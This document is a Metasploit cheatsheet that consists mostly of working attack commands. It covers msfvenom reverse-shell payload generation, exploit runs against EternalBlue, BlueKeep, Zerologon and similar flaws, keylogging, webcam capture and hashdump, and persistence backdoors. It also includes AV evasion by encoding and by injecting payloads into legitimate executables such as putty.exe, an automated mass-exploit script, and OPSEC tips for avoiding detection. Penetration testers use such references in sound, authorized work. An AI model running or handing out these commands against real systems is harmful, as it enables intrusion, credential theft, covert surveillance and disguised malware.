# Metasploit Framework Complete Cheatsheet

> **For authorized penetration testing and red team exercises only. Unauthorized use is illegal.**

---

## Table of Contents

- [Basic Setup & Configuration](#basic-setup--configuration)
- [Database Management](#database-management)
- [Reconnaissance & Scanning](#reconnaissance--scanning)
- [Payload Generation](#payload-generation)
- [Exploitation Workflow](#exploitation-workflow)
- [Post-Exploitation](#post-exploitation)
- [Persistence & Backdoors](#persistence--backdoors)
- [Privilege Escalation](#privilege-escalation)
- [Pivoting & Lateral Movement](#pivoting--lateral-movement)
- [Evasion Techniques](#evasion-techniques)
- [Advanced Multi/Handler](#advanced-multihandler)
- [Automation & Scripting](#automation--scripting)
- [Common Payloads Reference](#common-payloads-reference)

---

## Basic Setup & Configuration

### Starting Metasploit

```bash
# Start Metasploit console
msfconsole

# Start with specific database
msfconsole -d <database_name>

# Start with quiet mode (no banner)
msfconsole -q

# Start with specific workspace
msfconsole -w <workspace_name>
```

### Essential Commands

```bash
# Show help
help
?

# Search for modules
search <term>
search type:exploit platform:windows
search cve:2021

# Use a module
use <module_path>

# Show module info
info
show info

# Show options
show options
show advanced

# Set options
set <option> <value>
setg <option> <value>  # Global setting

# Run the module
run
exploit
```

---

## Database Management

### Database Operations

```bash
# Initialize database
msfdb init

# Start database service
msfdb start

# Connect to database
db_connect

# Check database status
db_status

# Create workspace
workspace -a <name>

# List workspaces
workspace

# Switch workspace
workspace <name>

# Delete workspace
workspace -d <name>
```

### Host & Service Management

```bash
# Add hosts
hosts -a <ip_range>

# List hosts
hosts

# Add services
services -a -p <port> -s <service> <host>

# List services
services

# Import Nmap results
db_import <nmap_xml_file>

# Export data
db_export -f xml <output_file>
```

---

## Reconnaissance & Scanning

### Built-in Scanners

```bash
# Port scanning
use auxiliary/scanner/portscan/tcp
set RHOSTS <target>
set PORTS 1-65535
run

# Service version detection
use auxiliary/scanner/ssh/ssh_version
set RHOSTS <target>
run

# SMB enumeration
use auxiliary/scanner/smb/smb_version
set RHOSTS <target>
run

# HTTP title grabber
use auxiliary/scanner/http/http_version
set RHOSTS <target>
run

# FTP banner grabber
use auxiliary/scanner/ftp/ftp_version
set RHOSTS <target>
run
```

### Discovery Modules

```bash
# Network discovery
use auxiliary/scanner/discovery/udp_sweep
set RHOSTS <network>
run

# ARP sweep
use auxiliary/scanner/discovery/arp_sweep
set RHOSTS <network>
run

# Ping sweep
use auxiliary/scanner/discovery/ping_sweep
set RHOSTS <network>
run
```

---

## Payload Generation

### Msfvenom Essentials

```bash
# List platforms
msfvenom --list platforms

# List architectures
msfvenom --list archs

# List formats
msfvenom --list formats

# List encoders
msfvenom --list encoders

# List payloads
msfvenom --list payloads
```

### Windows Payloads

```bash
# Basic Windows reverse shell
msfvenom -p windows/meterpreter/reverse_tcp LHOST=<ip> LPORT=<port> -f exe -o shell.exe

# Windows 64-bit reverse shell
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=<ip> LPORT=<port> -f exe -o shell64.exe

# Windows bind shell
msfvenom -p windows/meterpreter/bind_tcp LPORT=<port> -f exe -o bind.exe

# Staged payload
msfvenom -p windows/meterpreter/reverse_tcp LHOST=<ip> LPORT=<port> -f exe -o staged.exe

# Stageless payload
msfvenom -p windows/meterpreter_reverse_tcp LHOST=<ip> LPORT=<port> -f exe -o stageless.exe

# Encoded payload (shikata_ga_nai)
msfvenom -p windows/meterpreter/reverse_tcp LHOST=<ip> LPORT=<port> -e x86/shikata_ga_nai -i 3 -f exe -o encoded.exe

# PowerShell payload
msfvenom -p windows/meterpreter/reverse_tcp LHOST=<ip> LPORT=<port> -f psh -o shell.ps1

# DLL payload
msfvenom -p windows/meterpreter/reverse_tcp LHOST=<ip> LPORT=<port> -f dll -o shell.dll

# Service executable
msfvenom -p windows/meterpreter/reverse_tcp LHOST=<ip> LPORT=<port> -f exe-service -o service.exe
```

### Linux Payloads

```bash
# Linux reverse shell
msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=<ip> LPORT=<port> -f elf -o shell

# Linux 64-bit reverse shell
msfvenom -p linux/x64/meterpreter/reverse_tcp LHOST=<ip> LPORT=<port> -f elf -o shell64

# Linux bind shell
msfvenom -p linux/x86/meterpreter/bind_tcp LPORT=<port> -f elf -o bind

# Bash script payload
msfvenom -p cmd/unix/reverse_bash LHOST=<ip> LPORT=<port> -f raw
```

### Web Payloads

```bash
# PHP reverse shell
msfvenom -p php/meterpreter/reverse_tcp LHOST=<ip> LPORT=<port> -f raw -o shell.php

# ASP reverse shell
msfvenom -p windows/meterpreter/reverse_tcp LHOST=<ip> LPORT=<port> -f asp -o shell.asp

# JSP reverse shell
msfvenom -p java/jsp_shell_reverse_tcp LHOST=<ip> LPORT=<port> -f raw -o shell.jsp

# WAR payload
msfvenom -p java/meterpreter/reverse_tcp LHOST=<ip> LPORT=<port> -f war -o shell.war
```

### Advanced Payload Options

```bash
# Multiple iterations of encoding
msfvenom -p windows/meterpreter/reverse_tcp LHOST=<ip> LPORT=<port> -e x86/shikata_ga_nai -i 10 -f exe -o heavily_encoded.exe

# Template injection
msfvenom -p windows/meterpreter/reverse_tcp LHOST=<ip> LPORT=<port> -x /path/to/template.exe -f exe -o injected.exe

# Keep template functionality
msfvenom -p windows/meterpreter/reverse_tcp LHOST=<ip> LPORT=<port> -x /path/to/template.exe -k -f exe -o preserved.exe

# Custom encoder chain
msfvenom -p windows/meterpreter/reverse_tcp LHOST=<ip> LPORT=<port> -e x86/fnstenv_mov -e x86/shikata_ga_nai -i 3 -f exe -o chain_encoded.exe
```

---

## Exploitation Workflow

### Basic Exploit Usage

```bash
# Search for exploits
search type:exploit windows smb

# Use an exploit
use exploit/windows/smb/ms17_010_eternalblue

# Show targets
show targets

# Set target
set target <number>

# Show payloads
show payloads

# Set payload
set payload windows/x64/meterpreter/reverse_tcp

# Set required options
set RHOSTS <target>
set LHOST <attacker_ip>
set LPORT <port>

# Check if target is vulnerable
check

# Execute exploit
exploit
run
```

### Common Windows Exploits

```bash
# EternalBlue (MS17-010)
use exploit/windows/smb/ms17_010_eternalblue
set RHOSTS <target>
set payload windows/x64/meterpreter/reverse_tcp
set LHOST <attacker_ip>
exploit

# BlueKeep (CVE-2019-0708)
use exploit/windows/rdp/cve_2019_0708_bluekeep_rce
set RHOSTS <target>
set payload windows/x64/meterpreter/reverse_tcp
exploit

# PrintNightmare (CVE-2021-1675)
use exploit/windows/dcerpc/cve_2021_1675_printnightmare
set RHOSTS <target>
set SMBUser <username>
set SMBPass <password>
exploit

# Zerologon (CVE-2020-1472)
use exploit/windows/dcerpc/cve_2020_1472_zerologon
set RHOSTS <target>
exploit
```

### Web Application Exploits

```bash
# Apache Struts
use exploit/multi/http/struts2_content_type_ognl
set RHOSTS <target>
set TARGETURI /struts2-showcase/
exploit

# Drupal
use exploit/unix/webapp/drupal_drupalgeddon2
set RHOSTS <target>
set TARGETURI /
exploit

# WordPress
use exploit/unix/webapp/wp_admin_shell_upload
set RHOSTS <target>
set USERNAME admin
set PASSWORD password
exploit
```

---

## Post-Exploitation

### Meterpreter Basics

```bash
# Get system information
sysinfo

# Get current user
getuid

# Get privileges
getprivs

# Process list
ps

# Kill process
kill <pid>

# Migrate to process
migrate <pid>

# Get shell
shell

# Background session
background

# Return to meterpreter
sessions -i <id>

# Download file
download <remote_path> <local_path>

# Upload file
upload <local_path> <remote_path>

# Execute command
execute -f <command> -a "<arguments>"

# Screenshot
screenshot

# Webcam snapshot
webcam_snap

# List webcams
webcam_list

# Start keylogger
keyscan_start

# Dump keystrokes
keyscan_dump

# Stop keylogger
keyscan_stop
```

### System Information Gathering

```bash
# Network configuration
ipconfig
ifconfig

# Route table
route

# ARP table
arp

# Network connections
netstat -an

# Environment variables
getenv

# Registry operations
reg queryval -k <key> -v <value>
reg setval -k <key> -v <value> -d <data>

# Event logs
winenum

# Installed software
winenum
```

### File System Operations

```bash
# Current directory
pwd
getwd

# Change directory
cd <path>

# List files
ls
dir

# Make directory
mkdir <dirname>

# Remove directory
rmdir <dirname>

# Delete file
rm <filename>
del <filename>

# File search
search -f <filename>

# Get file attributes
getlwd

# Timestomp (modify timestamps)
timestomp <file> -v
timestomp <file> -m "01/01/2020 12:00:00"
```

---

## Persistence & Backdoors

### Registry Persistence

```bash
# Run key persistence
run persistence -S -U -X -i 60 -p <port> -r <ip>

# Service persistence
run persistence -S -X -i 60 -p <port> -r <ip>

# Startup folder persistence
run persistence -U -X -i 60 -p <port> -r <ip>
```

### Scheduled Tasks

```bash
# Create scheduled task
execute -f schtasks -a "/create /tn backdoor /tr \"C:\\windows\\system32\\backdoor.exe\" /sc onstart /ru system"

# List scheduled tasks
execute -f schtasks -a "/query"

# Delete scheduled task
execute -f schtasks -a "/delete /tn backdoor /f"
```

### Service Creation

```bash
# Create service
execute -f sc -a "create backdoor binpath= \"C:\\windows\\system32\\backdoor.exe\" start= auto"

# Start service
execute -f sc -a "start backdoor"

# Stop service
execute -f sc -a "stop backdoor"

# Delete service
execute -f sc -a "delete backdoor"
```

### Golden Ticket (Post-Domain Admin)

```bash
# Load kiwi extension
load kiwi

# Get SID and NTLM hash
lsa_dump_sam
lsa_dump_secrets

# Create golden ticket
golden_ticket_create -u <user> -d <domain> -s <sid> -k <krbtgt_hash> -t <ticket_file>
```

---

## Privilege Escalation

### Local Privilege Escalation

```bash
# Use local suggester
use post/multi/recon/local_exploit_suggester
set SESSION <session_id>
run

# UAC bypass techniques
use exploit/windows/local/bypassuac_eventvwr
set SESSION <session_id>
run

use exploit/windows/local/bypassuac_fodhelper
set SESSION <session_id>
run

# Token impersonation
use exploit/windows/local/ms16_032_secondary_logon_handle_privesc
set SESSION <session_id>
run

# AlwaysInstallElevated
use exploit/windows/local/always_install_elevated
set SESSION <session_id>
run
```

### Manual Privilege Escalation

```bash
# Get current privileges
getprivs

# Enable privileges
getprivs

# Check if SeDebugPrivilege is available
getprivs

# Migrate to SYSTEM process
ps
migrate <system_process_pid>

# Steal token
steal_token <pid>

# Drop token
drop_token

# Impersonate token
impersonate_token <domain>\\<user>
```

---

## Pivoting & Lateral Movement

### Portfwd (Port Forwarding)

```bash
# Add port forward
portfwd add -l <local_port> -p <remote_port> -r <remote_host>

# List port forwards
portfwd list

# Delete port forward
portfwd delete -l <local_port>

# Flush all forwards
portfwd flush
```

### Autoroute

```bash
# Load autoroute
use post/multi/manage/autoroute
set SESSION <session_id>
set SUBNET <network>/<netmask>
run

# Or from meterpreter
run autoroute -s <network>/<netmask>

# List routes
run autoroute -p

# Use SOCKS proxy
use auxiliary/server/socks_proxy
set SRVPORT 1080
run

# Configure proxychains
echo "socks4 127.0.0.1 1080" >> /etc/proxychains.conf
```

### Pass-the-Hash

```bash
# PsExec with hash
use exploit/windows/smb/psexec
set RHOSTS <target>
set SMBUser <username>
set SMBPass <hash>
set payload windows/meterpreter/reverse_tcp
exploit

# WMI with hash
use exploit/windows/local/wmi
set RHOSTS <target>
set SMBUser <username>
set SMBPass <hash>
exploit
```

### Lateral Movement Techniques

```bash
# SMB login check
use auxiliary/scanner/smb/smb_login
set RHOSTS <network>
set SMBUser <username>
set SMBPass <password>
run

# RDP login
use auxiliary/scanner/rdp/rdp_login
set RHOSTS <target>
set USERNAME <username>
set PASSWORD <password>
run

# SSH login
use auxiliary/scanner/ssh/ssh_login
set RHOSTS <target>
set USERNAME <username>
set PASSWORD <password>
run
```

---

## Evasion Techniques

### Encoder Usage

```bash
# Single encoding
msfvenom -p windows/meterpreter/reverse_tcp LHOST=<ip> LPORT=<port> -e x86/shikata_ga_nai -f exe -o encoded.exe

# Multiple iterations
msfvenom -p windows/meterpreter/reverse_tcp LHOST=<ip> LPORT=<port> -e x86/shikata_ga_nai -i 10 -f exe -o multi_encoded.exe

# Chain multiple encoders
msfvenom -p windows/meterpreter/reverse_tcp LHOST=<ip> LPORT=<port> -e x86/alpha_mixed -e x86/shikata_ga_nai -f exe -o chain_encoded.exe
```

### Template Injection

```bash
# Inject into legitimate executable
msfvenom -p windows/meterpreter/reverse_tcp LHOST=<ip> LPORT=<port> -x /path/to/putty.exe -f exe -o injected_putty.exe

# Keep original functionality
msfvenom -p windows/meterpreter/reverse_tcp LHOST=<ip> LPORT=<port> -x /path/to/putty.exe -k -f exe -o functional_putty.exe
```

### Process Migration

```bash
# From meterpreter session
ps
migrate <trusted_process_pid>

# Migrate to specific process
migrate explorer.exe
```

### Traffic Obfuscation

```bash
# Use HTTPS payload
set payload windows/meterpreter/reverse_https
set LHOST <ip>
set LPORT 443

# Enable SSL certificate verification bypass
set StagerVerifySSLCert false
set HandlerSSLCert /path/to/cert.pem
```

---

## Advanced Multi/Handler

### Basic Handler Setup

```bash
use exploit/multi/handler
set payload windows/meterpreter/reverse_tcp
set LHOST <ip>
set LPORT <port>
set ExitOnSession false
exploit -j
```

### Multiple Handlers

```bash
# Handler for Windows
use exploit/multi/handler
set payload windows/meterpreter/reverse_tcp
set LHOST 192.168.1.100
set LPORT 4444
set ExitOnSession false
exploit -j

# Handler for Linux
use exploit/multi/handler
set payload linux/x86/meterpreter/reverse_tcp
set LHOST 192.168.1.100
set LPORT 4445
set ExitOnSession false
exploit -j

# List jobs
jobs

# Kill job
jobs -k <job_id>
```

### Advanced Handler Options

```bash
# HTTPS handler
use exploit/multi/handler
set payload windows/meterpreter/reverse_https
set LHOST <ip>
set LPORT 443
set HandlerSSLCert /path/to/certificate.pem
set StagerVerifySSLCert false
exploit -j

# Handler with custom user agent
set HttpUserAgent "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36"

# Handler with proxy
set HttpProxyHost <proxy_ip>
set HttpProxyPort <proxy_port>
```

---

## Automation & Scripting

### Resource Scripts

```bash
# Create resource script
echo "use exploit/multi/handler" > handler.rc
echo "set payload windows/meterpreter/reverse_tcp" >> handler.rc
echo "set LHOST 192.168.1.100" >> handler.rc
echo "set LPORT 4444" >> handler.rc
echo "exploit -j" >> handler.rc

# Run resource script
msfconsole -r handler.rc

# From within msfconsole
resource handler.rc
```

### Automation Examples

```bash
# Auto-exploit script
echo "use auxiliary/scanner/portscan/tcp" > auto_exploit.rc
echo "set RHOSTS 192.168.1.0/24" >> auto_exploit.rc
echo "set PORTS 445" >> auto_exploit.rc
echo "run" >> auto_exploit.rc
echo "use exploit/windows/smb/ms17_010_eternalblue" >> auto_exploit.rc
echo "set payload windows/x64/meterpreter/reverse_tcp" >> auto_exploit.rc
echo "set LHOST 192.168.1.100" >> auto_exploit.rc
echo "exploit" >> auto_exploit.rc
```

### Post-Exploitation Automation

```bash
# Auto-migrate script
echo "migrate explorer.exe" > auto_post.rc
echo "getuid" >> auto_post.rc
echo "sysinfo" >> auto_post.rc
echo "run post/windows/gather/enum_system" >> auto_post.rc
echo "hashdump" >> auto_post.rc

# Run on session creation
set AutoRunScript multi_console_command -rc auto_post.rc
```

---

## Common Payloads Reference

### Windows Payloads Quick Reference

| Payload | Description | Usage |
|---------|-------------|-------|
| `windows/meterpreter/reverse_tcp` | Standard reverse shell | Most common, staged |
| `windows/meterpreter_reverse_tcp` | Stageless reverse shell | Single payload, larger |
| `windows/shell_reverse_tcp` | Basic cmd shell | Lightweight, no meterpreter |
| `windows/powershell_reverse_tcp` | PowerShell reverse shell | PowerShell-based |
| `windows/x64/meterpreter/reverse_tcp` | 64-bit meterpreter | For 64-bit targets |

### Linux Payloads Quick Reference

| Payload | Description | Usage |
|---------|-------------|-------|
| `linux/x86/meterpreter/reverse_tcp` | Linux meterpreter | Full featured |
| `linux/x86/shell_reverse_tcp` | Basic bash shell | Lightweight |
| `cmd/unix/reverse_bash` | Bash reverse shell | No binary required |
| `linux/x64/meterpreter/reverse_tcp` | 64-bit meterpreter | For 64-bit systems |

### Web Payloads Quick Reference

| Payload | Description | Usage |
|---------|-------------|-------|
| `php/meterpreter/reverse_tcp` | PHP meterpreter | Web applications |
| `java/jsp_shell_reverse_tcp` | JSP shell | Java web apps |
| `python/meterpreter/reverse_tcp` | Python meterpreter | Python environments |
| `ruby/shell_reverse_tcp` | Ruby shell | Rails applications |

---

## Tips & Best Practices

### OPSEC Considerations

1. **Use HTTPS payloads** for encrypted communication
2. **Migrate to trusted processes** immediately after exploitation
3. **Use legitimate-looking file names** and paths
4. **Clean up artifacts** after operations
5. **Use domain fronting** when possible
6. **Randomize callback intervals** to avoid pattern detection

### Performance Optimization

1. **Use stageless payloads** for unreliable networks
2. **Set appropriate timeouts** for slow targets
3. **Limit concurrent sessions** to avoid resource exhaustion
4. **Use compression** for large file transfers

### Troubleshooting Common Issues

1. **Firewall blocking connections**: Use different ports/protocols
2. **AV detection**: Use encoders and template injection
3. **Session dying**: Check process migration and stability
4. **Slow performance**: Optimize payload size and encoding

---

*This cheatsheet is for authorized security testing only. Always ensure you have proper authorization before conducting any penetration testing activities.*